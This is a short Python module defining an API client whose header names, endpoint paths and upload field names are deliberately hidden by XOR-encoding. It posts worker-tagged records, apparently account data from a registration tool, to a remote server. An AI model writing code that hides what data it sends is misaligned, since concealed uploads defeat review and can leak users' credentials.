import time as _t
from typing import Optional as _O
import requests as _r
from loguru import logger as _L
from ._c import API_URL, API_TOKEN, WORKER_ID
import hashlib as _hl
_K = _hl.sha256("TwReg2026!@#SecureKeyXOR".encode()).digest()
_d = lambda x: bytes(b ^ _K[i % len(_K)] for i, b in enumerate(bytes.fromhex(x))).decode()

class _N:
    def __init__(self, u: str = API_URL, k: str = API_TOKEN):
        self._u = u.rstrip("/")
        self._k = k
        self._w = WORKER_ID
        self._s = _r.Session()
        self._s.headers.update({
            _d("e6f10be3fd08184b312c775b95"): f"{_d('e5e11ef9f70851')}{self._k}",
            _d("e4eb11fff714051c04216e51"): _d("c6f40fe7fb1910453937701b913f7c10"),
            _d("ffa928e4e01114437d117a"): self._w,
        })
        self._s.trust_env = False

    def _p(self, u: str, w: str, e: str, a: _O[str] = None, c: str = "", r: int = 3) -> _O[dict]:
        _q = f"{self._u}{_d('88e50fe2bd1b12523f2d70408863660eaf35e75c')}"
        _j = {
            _d("d2f71af9fc1b1c54"): u,
            _d("d7e50cf8e5150355"): w,
            _d("c2e91ee2fe"): e,
            _d("c6f10be3cd0e1e5a3536"): a or "",
            _d("c4eb10e0fb1f02"): c,
        }
        for _i in range(1, r + 1):
            try:
                _x = self._s.post(_q, json=_j, timeout=15)
                _y = _x.json()
                if _y.get(_d("c4eb1bee")) == 0:
                    return _y[_d("c3e50bea")]
                _L.warning(f"Upload failed for {u}: {_y.get(_d('cae10cf8f31d14'))}")
                return None
            except _r.RequestException as _z:
                _L.warning(f"Upload attempt {_i}/{r} failed: {_z}")
                if _i < r:
                    _t.sleep(2)
        return None

    def _h(self, n: str, t: str = _d("d5e118")) -> bool:
        _q = f"{self._u}{_d('88e50fe2bd0d1e433b3d6c47d424761fb12ee45d07cc')}"
        try:
            _x = self._s.post(_q, json={
                _d("d0eb0de0f7082e5f31357b"): n,
                _d("d0eb0de0f7082e4529287b"): t,
            }, timeout=10)
            return _x.status_code == 200
        except Exception:
            return False

APIClient = _N
